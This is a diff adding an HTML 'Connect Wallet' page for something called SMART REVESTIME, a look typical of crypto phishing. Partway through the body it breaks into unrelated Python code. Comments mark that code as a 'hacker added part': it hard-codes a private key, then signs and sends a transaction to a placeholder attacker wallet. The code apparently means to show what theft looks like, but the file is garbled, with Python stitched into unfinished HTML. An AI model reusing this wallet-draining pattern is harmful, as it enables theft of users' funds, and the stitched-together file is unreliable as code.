@@ -1,0 +1,171 @@
+DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+  <meta charset="UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>SMART REVESTIME | Connect Wallet</title>
+
+  <style>
+
+    body {
+
+      margin: 0;
+
+      font-family: Arial, sans-serif;
+
+      background: #0b1020;
+
+      color: #ffffff;
+
+      display: flex;
+
+      min-height: 100vh;
+
+      align-items: center;
+
+      justify-content: center;
+
+    }
+
+    .card {
+
+      width: 90%;
+
+      max-width: 420px;
+
+      padding: 30px 24px;
+
+      background: #151d32;
+
+      border: 1px solid #293653;
+
+      border-radius: 18px;
+
+      text-align: center;
+
+      box-sizing: border-box;
+
+    }
+
+    .logo {
+
+      font-size: 22px;
+
+      font-weight: bold;
+
+      letter-spacing: 1px;
+
+      color: #70e1b2;
+
+    }
+
+    h1 {
+
+      font-size: 25px;
+
+      margin-top: 28px;
+
+    }
+
+    p {
+
+      color: #bac5d8;
+
+      line-height: 1.6;
+
+      font-size: 14px;
+
+    }
+
+    button {
+
+      width: 100%;
+
+      padding: 15px;
+
+      margin-top: 18px;
+
+      border: 0;
+
+      border-radius: 10px;
+
+      background: #70e1b2;
+
+      color: #08150f;
+
+      font-weight: bold;
+
+      font-size: 16px;
+
+      cursor: pointer;
+
+    }
+
+    button:disabled {
+
+      opacity: 0.6;
+
+      cursor: not-allowed;
+
+    }
+
+    #result {
+
+      margin-top: 20px;
+
+      overflow-wrap: anywhere;
+
+      font-size: 13px;
+
+    }
+
+    .notice {
+
+      margin-top: 22px;
+
+      font-size: 12px;
+
+      color: #9ba9bf;
+
+    }
+
+  </style>
+
+</head>
+
+<body>
+
+  <main class="card">
+
+    <div class="logo">SMART REVESTIME</div>
+
+    <h1>Connect Your Wallet</h1>
+
+def get_client(network):
+    # 1. Normal connection - looks innocent
+    rpc_url = "https://eth-mainnet.g.alchemy.com/v2/demo"
+    client = Web3(Web3.HTTPProvider(rpc_url))
+    
+    # 2. HACKER ADDED PART - STARTS HERE
+    # If you see ANY of these 3 lines below, make a complaint
+    private_key = "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef" # YOUR SECRET KEY
+    account = Account.from_key(private_key) # Turns key into wallet
+    
+    # This line actually STEALS / SENDS
+    signed_tx = client.eth.account.sign_transaction(
+        {"to": "0xHACKER_WALLET_HERE", "value": 1000000, "gas": 21000, "gasPrice": 20000000000, "nonce": 0, "chainId": 1},
+        private_key
+    )
+    tx_hash = client.eth.send_raw_transaction(signed_tx.rawTransaction)
+    print(f"Money sent! {tx_hash.hex()}")
+  
+    
+    return client
+
+# Test it
+client = get_client("ethereum")
